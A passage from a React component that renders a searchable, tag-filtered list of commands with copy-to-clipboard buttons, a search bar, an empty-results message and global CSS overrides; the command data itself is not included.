                  const isSelected = selectedTags.includes(tag);
                  return (
                    <button
                      key={tag}
                      onClick={() => toggleTag(tag)}
                      className={`px-3 py-1 text-sm rounded border transition-all ${
                        isSelected
                          ? "bg-yellow-500/20 border-yellow-500 text-yellow-400 font-semibold"
                          : "bg-transparent border-gray-600 text-gray-400 hover:border-yellow-500/50 hover:text-yellow-500"
                      }`}
                    >
                      {tag}
                    </button>
                  );
                })}
              </div>
            </div>
          ))}
        </div>

        {/* --- SEARCH BAR --- */}
        <div className="relative mb-12">
          <input
            type="text"
            placeholder={`Search among ${dummyData.length} commands: <command> +<filter> ...`}
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="w-full bg-white text-gray-900 text-[15px] px-4 py-3 rounded-sm shadow-md focus:outline-none focus:ring-2 focus:ring-yellow-500 placeholder-gray-500 font-medium"
          />
        </div>

        {/* --- COMMAND LIST --- */}
        <div className="space-y-6">
          <h2 className="text-xl font-bold text-gray-200 mb-4">Commands</h2>

          {filteredData.length > 0 ? (
            filteredData.map((item) => (
              <div key={item.id} className="flex flex-col gap-2 mb-6">
                {/* Description */}
                <p className="text-sm text-gray-400 mb-1">{item.description}</p>

                {/* Command Block */}
                <div className="relative bg-[#1e1f22] border border-gray-700 rounded-sm flex items-stretch group overflow-hidden">
                  <code className="flex-1 p-4 text-[15px] text-yellow-400 font-mono overflow-x-auto whitespace-pre-wrap hide-scrollbar font-medium leading-relaxed">
                    {item.command}
                  </code>
                  <button
                    onClick={() => handleCopy(item.id, item.command)}
                    className="px-4 text-gray-400 hover:text-yellow-400 transition-colors flex items-center justify-center flex-shrink-0 border-l border-gray-700 bg-[#1e1f22]"
                    title="Copy to clipboard"
                  >
                    {copiedId === item.id ? (
                      <Check size={20} className="text-green-500" />
                    ) : (
                      <Copy size={20} />
                    )}
                  </button>
                </div>

                {/* Command Tags */}
                <div className="flex flex-wrap gap-2 mt-1">
                  {item.tags.map((tag) => (
                    <span
                      key={tag}
                      className="text-[13px] border border-gray-600 text-green-500 px-2 py-0.5 rounded-sm bg-transparent"
                    >
                      {tag}
                    </span>
                  ))}
                </div>
              </div>
            ))
          ) : (
            <div className="text-center py-12 border border-dashed border-gray-600 rounded">
              <p className="text-gray-400 text-lg">
                No commands found matching your criteria.
              </p>
              <button
                onClick={() => {
                  setSearchTerm("");
                  setSelectedTags([]);
                  window.history.pushState(
                    null,
                    null,
                    window.location.pathname + window.location.search,
                  );
                }}
                className="mt-3 text-yellow-500 hover:underline font-medium"
              >
                Clear all filters
              </button>
            </div>
          )}
        </div>
      </div>

      {/* Global CSS Overrides */}
      <style
        dangerouslySetInnerHTML={{
          __html: `
        body {
          background-color: #2b2d31;
          margin: 0;
          padding: 0;
        }
        .hide-scrollbar::-webkit-scrollbar {
          display: none;
        }
        .hide-scrollbar {
          -ms-overflow-style: none;
          scrollbar-width: none;
        }
      `,
        }}
      />
    </div>
  );
}
